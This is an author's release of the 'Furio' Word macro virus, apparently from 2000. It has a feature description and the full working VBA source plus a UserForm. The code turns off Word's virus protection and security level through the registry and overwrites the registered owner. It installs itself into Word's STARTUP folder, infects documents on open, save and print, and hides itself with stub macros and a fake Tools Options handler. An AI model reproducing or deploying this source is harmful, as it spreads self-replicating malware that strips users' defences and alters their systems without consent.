
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FURIO.TXT]ÄÄÄ
Furio Word Macro Virus

Version(s) 	v1.00

Type              : Module Virus W97/2000 

Number of Macros  : 11 including 3 Basic Stealth Macros as below :-

AutoClose         :  Contains the main infection routine. Sets Word
                     security settings to minimum. Sets "The WalruS" to the
                     computers registered username. Also checks for payload
                     trigger.
SpreadTheWord     :  Document only infection macro.
FileOpen          :  Calls SpreadTheWord macro and performs as normal.
FileSave          :  Calls SpreadTheWord macro and performs as normal.
FilePrintDefault  :  Calls SpreadTheWord macro, checks for payload 2 and
                     performs as normal.
Payload           :  Opens Notepad and types a message. Changes screen to
                     white text on blue background.
HelpAbout         :  Displays a UserForm.
ToolsOptions      :  Sets Virus Protection and Save Normal Prompt back to ON,
                     performs as normal and then resets them back to OFF
ViewVBCode        :  Simple Stealth (Hooks name)
ToolsMacro        :  Simple Stealth (Hooks name)
FileTemplates     :  Simple Stealth (Hooks name)

Virus Description :  The Furio virus does not infect the Normal Template at
                     all. It also does not rely on Auto run macros to spread.
                     This makes it very different to the common macro virus.
                     When an infected document is run the virus sets all of
                     the Word virus protection/Security settings to their
                     lowest. It then registers the computer username to "The
                     WalruS". It then exports its macro code to C:\Windows\Furio.drv
                     and sets this file as hidden. It then exports its UserForm
                     to "C:\Windows\AboutFrm.Frm". The virus then checks to see
                     whether its installed by seeing if the file
                     "C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot"
                     exists and If not then installs itself. It does this by opening
                     the normal template as a document, infecting it with the exported
                     macros and UserForm then saves it to
                     "C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot" and
                     closing it. All of the above is done on AutoClose. The
                     normal template is not infected and therefore does not
                     increase in size. Furio.dot is now installed everytime
                     word is opened due to it being in the Word StartUp folder.
                     To infect documentsThe Furio.dot hooks FileOpen, FileSave
                     and FilePrintDefault macros. They behave as normal however
                     they also infect and save the active document should the
                     marker text "' Furio" not be present on line 1 of the code.

Stealth           :  The virus contains 3 very simple stealth macros
                     ViewVBCode, ToolsMacro, FileTemplates. They contain no
                     code and just "hook" the macro so it no longer performs
                     its normal behaviour. A ToolsOptions macro is also
                     present for stealth. When the user selects this macro
                     the virus restores the Virus Protection and Save Normal
                     Prompt settings to ON, displays the Tools Options dialog
                     as usual and then resets these settings to OFF once the
                     menu has been closed.

Payloads          : If the Second Now = The Minute Now on AutoClose, the
                    Furio virus opens notepad and displays the following
                    message "Hello there! Im the WalruS. Welcome To My New
                    Creation - Furio  ///0-0\\\    WalruS 09/00". The virus
                    then sets the Word environment to white text on blue
                    screen. If Help About is selected a userform is shown.
                    If Print is selected and the second now is 59 then Furio
                    types " Please Select Help About For More Information!"
                    at the end of the document and then prints as normal.

The WalruS 09/00

e-mail WalruS@z.com	For comments/questions or bugs etc!	
Home Page 		http://www.walrus.8k.com/
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FURIO.TXT]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FURIO.BAS]ÄÄÄ
Attribute VB_Name = "Furio"
' Furio
Sub AutoClose()
    On Error Resume Next
    ' Furio Virus v1.00 by WalruS 09/00
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Application.DisplayAlerts = wdAlertsNone
    Application.DisplayStatusBar = False
    Application.ScreenUpdating = False
    ActiveDocument.ReadOnlyRecommended = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The WalruS"
    ActiveDocument.VBProject.VBComponents("Furio").export ("C:\Windows\Furio.drv")
    ActiveDocument.VBProject.VBComponents("AboutFrm").export ("C:\Windows\AboutFrm.Frm")
    SetAttr ("C:\Windows\Furio.drv"), 6
    Template = Dir("C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot")
    If Template = "" Then
    NormalTemplate.OpenAsDocument
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\Furio.drv")
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\AboutFrm.frm")
    ActiveDocument.SaveAs ("C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot")
    NormalTemplate.Saved = True
    ActiveDocument.Close
    End If
    If Second(Now) = Minute(Now) Then Call Payload
End Sub

Sub SpreadTheWord()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Furio").CodeModule.Lines(1, 1) <> "' Furio" Then
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\Furio.drv")
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\AboutFrm.frm")
    ActiveDocument.Save
    End If
End Sub

Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call SpreadTheWord
End Sub

Sub FileSave()
    On Error Resume Next
    Call SpreadTheWord
    ActiveDocument.Save
End Sub

Sub FilePrintDefault()
    On Error Resume Next
    Call SpreadTheWord
    If Second(Now) = 59 Then Selection.TypeText " Please Select Help About For More Information!"
    ActiveDocument.PrintOut
End Sub

Sub Payload()
    On Error Resume Next
    Options.BlueScreen = True
    MyApp = Shell("notepad.exe", 1)
    SendKeys "Hello there!~~Im the WalruS. Welcome To My New Creation - Furio~~~///0-0\\\    WalruS 09/00", True
    AppActivate (MyApp)
End Sub

Sub HelpAbout()
    On Error Resume Next
    AboutFrm.Show
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub

Sub ViewVBCode(): End Sub
Sub ToolsMacro(): End Sub
Sub FileTemplates(): End Sub ' cya
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FURIO.BAS]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ABOUTFRM.FRM]ÄÄÄ
VERSION 5.00
Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} AboutFrm 
   Caption         =   "WalruS Presents Furio"
   ClientHeight    =   3225
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4710
   OleObjectBlob   =   "AboutFrm.frx":0000
   StartUpPosition =   1  'CenterOwner
End
Attribute VB_Name = "AboutFrm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Label2_Click()
MsgBox "Goo Goo G'Joob", vbExclamation, "Furio By WalruS"
End Sub
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ABOUTFRM.FRM]ÄÄÄ
